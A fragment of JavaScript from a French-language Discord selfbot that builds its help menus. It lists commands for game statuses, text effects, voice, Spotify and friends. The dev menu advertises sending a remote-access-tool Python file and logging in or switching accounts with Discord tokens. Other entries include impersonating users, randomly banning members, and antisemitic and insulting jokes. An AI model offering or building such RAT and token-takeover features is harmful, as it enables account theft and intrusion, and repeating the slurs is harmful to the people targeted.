                ${client.tools === "k3s" ? "" : "\`"}${prefix}lol${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status League of Legends: Wild Rift***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}wallof${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Call of Duty: Warzone***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}roblox${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Roblox***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}uno${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Uno***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}geometry dash${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Geometry Dash***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}subway${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Subway Surfers***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}candy crush${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Candy Crush Saga***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}piano tiles${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Piano Tiles***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}minecraft${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Minecraft***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}fnaf${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Five night at Freddy's***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}dokkan${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Dokkan Battle***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}pokemongo${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Pokemon Go***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}genshin${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Genshin Impact***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}stumble${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Stumble Guys***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}blue archive${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Blue Archive***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}honkai impact${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Honkai Impact***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}honkai star${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Honkai Star Rail***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}treasure cruise${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Treasure Cruise***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}sds${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Seven Deadly Sins***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}samsung stop${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Arrête le status samsung***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "texte"){
                message.edit(`ガ __**${name} - Texte**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}barre (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Barre votre texte***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gras (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Met votre texte en gras***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}italique (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Met votre texte en italique***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}morse (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Transforme votre texte en morse***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}retourne (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Retourne votre texte*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}reverse (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Inverse le sens du texte*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}blanc (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Transforme votre texte en blanc***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}bleu (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Transforme votre texte en bleu***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}orange (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Transforme votre texte en orange***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rose (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Transforme votre texte en rose***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rouge (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Transforme votre texte en rouge***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vert (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Transforme votre texte en vert***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}clap (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Remplace les espaces par des claps***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}empty${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie un message vide***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}unflip${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Unflip***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tableflip${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Tableflip***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}lenny${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Lenny***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}shrug${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Shrug***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "fun"){
                message.edit(`ガ __**${name} - Texte**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}kiss (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Embrasse un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}feed (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Nourri un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}pat (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Caresse un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hug (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Caline un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}slap (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Gifle un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}issou${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Issou***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tg${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Tg fdp***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}daronned${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***daronned***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}random${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un nombre random***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}facepalm${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Facepalm***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}load${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***fais un chargement***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}troll${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***troll ascii***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}biffle${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***je te biffle salope***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}h4x0r${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***h4x0r détecté***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}bontoutou${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***bon toutou***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}8ball${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Répond à ta question***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}suicide${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Kill Me***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}veski${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***veski***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}juif${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***juif detecté***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}pf${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Pile ou Face***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}iq${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Fait un test de QI***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tweet${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Génère un tweet***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}say (user) (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie un texte à la place d'un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}banroulette${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Banni un membre aléatoire du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}massreact (messageId)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Réagi aléatoirement à un message***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}changemind${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Changemind***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}clyde${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoi un message de Clyde***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}react (messageId) (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Réagi à un message avec le texte indiqué***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}fun2${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la suite des commandes***
                `.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "fun2"){
                message.edit(`ガ __**${name} - Fun II**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}gsearch (url)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Cherche une image sur google***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gavatar (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Recherche l'avatar d'un utilisateur sur google***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}senddog${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie une image de chien***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}sendfox${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie une image de renard***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}sendcat${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie une image de chat***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}sadcat${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie une image de chat triste***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}biden (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Fait parler joe biden*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}pikachu (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Fait parler pikachu*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}stonks (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Stonks*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}notstonks (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Not Stonks*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}amongus${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Fait parler une urgence amongus*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}drip (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Drip*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gun (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Décharge ton pistolet*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ad (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Transforme un utilisateur en pub*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}alert (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie une alerte*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}caution (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Caution*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}heaven (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Bienvenue au paradis*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}dockofshame${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Dock of Shame*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}first time (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***First time*** ${client.premium ? "" : "|「Premium Requis」"}`.replaceAll('                ', ''))
            }
            

            else if (message.content === prefix + "voice"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Voice」`)
                .setDescription(`${prefix}vcjoin ▸ 𝐑𝐞𝐣𝐨𝐢𝐧𝐭 𝐮𝐧 𝐬𝐚𝐥𝐨𝐧 𝐯𝐨𝐜𝐚𝐥
                ${prefix}autojoin ▸ 𝐒𝐞𝐭𝐮𝐩 𝐥'𝐚𝐮𝐭𝐨𝐣𝐨𝐢𝐧
                ${prefix}vcleave ▸ 𝐐𝐮𝐢𝐭𝐭𝐞 𝐮𝐧 𝐯𝐨𝐜𝐚𝐥
                ${prefix}vccam ▸ 𝐀𝐜𝐭𝐢𝐯𝐞/𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐞 𝐥𝐚 𝐜𝐚𝐦
                ${prefix}vcstream ▸ 𝐀𝐜𝐭𝐢𝐯𝐞/𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐞 𝐥𝐞 𝐬𝐭𝐫𝐞𝐚𝐦
                ${prefix}vcmute ▸ 𝐌𝐮𝐭𝐞 𝐮𝐧 𝐮𝐭𝐢𝐥𝐢𝐬𝐚𝐭𝐞𝐮𝐫
                ${prefix}vsdeaf ▸ 𝐌𝐮𝐭𝐞 𝐜𝐚𝐬𝐪𝐮𝐞
                ${prefix}vcunmute ▸ 𝐔𝐧𝐦𝐮𝐭𝐞 𝐮𝐧 𝐮𝐭𝐢𝐥𝐢𝐬𝐚𝐭𝐞𝐮𝐫
                ${prefix}vcundeaf ▸ 𝐔𝐧𝐦𝐮𝐭𝐞 𝐜𝐚𝐬𝐪𝐮𝐞
                ${prefix}voice2 ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐥𝐚 𝐬𝐮𝐢𝐭𝐞`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                message.edit(`ガ __**${name} - Voice**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}vcjoin (channel)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Rejoint un salon avec le module de stream*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}autojoin (channel/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Rejoint automatiquement un salon lors du démarrage du selfbot*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vcleave${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Quitte le salon vocale du module stream***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vccam (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive la caméra lors d'un joinvc***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vcstream (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le stream lors d'un joinvc***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vcmute (on/off/user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive/mute un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vcdeaf (on/off/user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive/mute casque un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vcunmute (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Unmute un utilisateur du vocale***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vcundeaf${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Unmute casque un utilisateur du vocale***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}move (member) (channel)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Change le salon vocale d'un membre***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}moveall (channel)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Change le salon vocale de tous les utilisateurs***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}lock (channel)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Vérouille un salon vocale***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}unlock (channel)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Dévérouille un salon vocale***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}limit (channel) (nombre)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Défini une limite de personne dans un vocale***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "voice2"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Voice II」`)
                .setDescription(`${prefix}move ▸ 𝐃𝐞𝐩𝐥𝐚𝐜𝐞 𝐮𝐧 𝐮𝐭𝐢𝐥𝐢𝐬𝐚𝐭𝐞𝐮𝐫 𝐝'𝐮𝐧 𝐯𝐨𝐜𝐚𝐥
                ${prefix}moveall ▸ 𝐃𝐞𝐩𝐥𝐚𝐜𝐞 𝐭𝐨𝐮𝐬 𝐥𝐞𝐬 𝐮𝐭𝐢𝐥𝐢𝐬𝐚𝐭𝐞𝐮𝐫 𝐝'𝐮𝐧 𝐯𝐨𝐜𝐚𝐥
                ${prefix}lock ▸ 𝐕𝐞𝐫𝐨𝐮𝐢𝐥𝐥𝐞 𝐮𝐧 𝐯𝐨𝐜𝐚𝐥
                ${prefix}unlock ▸ 𝐃𝐞𝐯𝐞𝐫𝐨𝐮𝐢𝐥𝐥𝐞 𝐮𝐧 𝐯𝐨𝐜𝐚𝐥
                ${prefix}limit ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞 𝐥𝐞𝐬 𝐥𝐢𝐦𝐢𝐭𝐞𝐬 𝐝'𝐮𝐧 𝐯𝐨𝐜𝐚𝐥`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})
            }

            else if (message.content === prefix + "spotify"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Spotify」`)
                .setDescription(`${prefix}playsong ▸ 𝐉𝐨𝐮𝐞 𝐮𝐧𝐞 𝐦𝐮𝐬𝐢𝐪𝐮𝐞
                ${prefix}addqueue ▸ 𝐀𝐣𝐨𝐮𝐭𝐞 𝐮𝐧𝐞 𝐦𝐮𝐬𝐢𝐪𝐮𝐞 𝐝𝐚𝐧𝐬 𝐥𝐚 𝐪𝐮𝐞𝐮𝐞
                ${prefix}pause ▸ 𝐌𝐞𝐭 𝐞𝐧 𝐩𝐚𝐮𝐬𝐞
                ${prefix}resume ▸ 𝐑𝐞𝐩𝐫𝐞𝐧𝐝 𝐥𝐚 𝐦𝐮𝐬𝐢𝐪𝐮𝐞
                ${prefix}next ▸ 𝐒𝐤𝐢𝐩 𝐥𝐚 𝐦𝐮𝐬𝐢𝐪𝐮𝐞
                ${prefix}previous ▸ 𝐑𝐞𝐣𝐨𝐮𝐞 𝐥𝐚 𝐦𝐮𝐬𝐢𝐪𝐮𝐞 𝐝'𝐚𝐯𝐚𝐧𝐭
                ${prefix}volume ▸ 𝐂𝐡𝐚𝐧𝐠𝐞 𝐥𝐞 𝐯𝐨𝐥𝐮𝐦𝐞
                ${prefix}playing ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐥𝐚 𝐦𝐮𝐬𝐢𝐪𝐮𝐞 𝐞𝐧 𝐜𝐨𝐮𝐫𝐬
                ${prefix}shuffle ▸ 𝐌𝐞𝐥𝐚𝐧𝐠𝐞 𝐥𝐚 𝐥𝐞𝐜𝐭𝐮𝐫𝐞
                ${prefix}repeat ▸ 𝐑𝐞𝐩𝐞𝐭𝐞 𝐨𝐮 𝐧𝐨𝐧 𝐥𝐚 𝐩𝐥𝐚𝐲𝐥𝐢𝐬𝐭 `.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                message.edit(`ガ __**${name} - Spotify**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}playsong (musique)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Joue une musique sur votre spotify*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}addqueue (musique)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute une musique à votre queue*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}pause${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Met en pause votre musique spotify*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}resume${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Reprend votre musique spotify*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}next${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Joue la prochaine musique*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}previous${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Joue la musique précédente*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}volume (0-100)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le volume de votre lecteur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}playing${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la musique que vous jouez actuellement*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}shuffle (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le mélangement des musiques*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}repeat (playlist/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive la lécture en boucle*** ${client.premium ? "" : "|「Premium Requis」"}`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "dev"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Dev」`)
                .setDescription(`${prefix}eval ▸ 𝐓𝐞𝐬𝐭 𝐮𝐧 𝐜𝐨𝐝𝐞 𝐞𝐧 𝐣𝐚𝐯𝐚𝐬𝐜𝐫𝐢𝐩𝐭
                ${prefix}exec ▸ 𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐮𝐧 𝐜𝐨𝐝𝐞 𝐞𝐧 𝐛𝐚𝐬𝐡 (𝐝𝐚𝐧𝐠𝐞𝐫𝐞𝐮𝐱)
                ${prefix}experiments ▸ 𝐀𝐜𝐭𝐢𝐯𝐞 𝐥𝐞𝐬 𝐞𝐱𝐩𝐞𝐫𝐢𝐦𝐞𝐧𝐭𝐬 𝐝𝐞 𝐯𝐨𝐭𝐫𝐞 𝐝𝐢𝐬𝐜𝐨𝐫𝐝
                ${prefix}tokenlogin ▸ 𝐄𝐧𝐯𝐨𝐢𝐞 𝐮𝐧 𝐜𝐨𝐝𝐞 𝐩𝐨𝐮𝐫 𝐬𝐞 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐫 𝐫𝐚𝐩𝐢𝐝𝐞𝐦𝐞𝐧𝐭 à 𝐮𝐧 𝐭𝐨𝐤𝐞𝐧
                ${prefix}rat ▸ 𝐄𝐧𝐯𝐨𝐢𝐞 𝐮𝐧 𝐫𝐚𝐭 𝐭𝐨𝐨𝐥
                ${prefix}gettoken ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐜𝐨𝐦𝐦𝐞𝐧𝐭 𝐫é𝐜𝐮𝐩é𝐫𝐞𝐫 𝐬𝐨𝐧 𝐭𝐨𝐤𝐞𝐧 𝐬𝐮𝐫 𝐩𝐜/𝐦𝐨𝐛𝐢𝐥𝐞
                ${prefix}switch ▸ 𝐂𝐡𝐚𝐧𝐠𝐞 𝐥'𝐮𝐭𝐢𝐥𝐢𝐬𝐚𝐭𝐞𝐮𝐫 𝐝𝐮 𝐬𝐞𝐥𝐟𝐛𝐨𝐭`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                else message.edit(`ガ __**${name} - Dev**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}eval (code)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Test un code en JavaScript*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}exec (code)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Execute un code en bash (dangereux)*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}experiments${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active les experiments de votre discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tokenlogin (token)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie un code pour se connecter rapidement à un token***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rat (bottoken)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie un fichier .py contenant un rat tool lié à un bot discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gettoken (pc/mobile)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche comment récupérer son token sur pc/mobile***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}switch (token)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Change l'utilisateur du selfbot***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "friends"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Friends」`)
                .setDescription(`${prefix}delete all friends ▸ 𝐒𝐮𝐩𝐩𝐫𝐢𝐦𝐞 𝐯𝐨𝐬 𝐚𝐦𝐢𝐬
                ${prefix}friends send ▸ 𝐄𝐧𝐯𝐨𝐢𝐞 𝐚 𝐯𝐨𝐬 𝐚𝐦𝐢𝐬
                ${prefix}unblock all ▸ 𝐃𝐞𝐛𝐥𝐨𝐪𝐮𝐞 𝐚𝐥𝐥
                ${prefix}friend invite ▸ 𝐂𝐫𝐞𝐞 𝐮𝐧 𝐥𝐢𝐞𝐧 𝐝'𝐚𝐦𝐢
                ${prefix}friend delete ▸ 𝐒𝐮𝐩𝐩𝐫𝐢𝐦𝐞 𝐯𝐨𝐬 𝐥𝐢𝐞𝐧𝐬
                ${prefix}friend list ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐯𝐨𝐬 𝐥𝐢𝐞𝐧𝐬
                ${prefix}addfriend ▸ 𝐝𝐞𝐦𝐚𝐧𝐝𝐞 𝐞𝐧 𝐚𝐦𝐢
                ${prefix}delfriend ▸ 𝐑𝐞𝐭𝐢𝐫𝐞 𝐮𝐧 𝐚𝐦𝐢
                ${prefix}block ▸ 𝐁𝐥𝐨𝐪𝐮𝐞 𝐮𝐧 𝐮𝐬𝐞𝐫
                ${prefix}unblock ▸ 𝐃𝐞𝐛𝐥𝐨𝐪𝐮𝐞 𝐮𝐧 𝐮𝐬𝐞𝐫
                ${prefix}ignoreall ▸ 𝐈𝐠𝐧𝐨𝐫𝐞 𝐯𝐨𝐬 𝐝𝐞𝐦𝐚𝐧𝐝𝐞𝐬`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

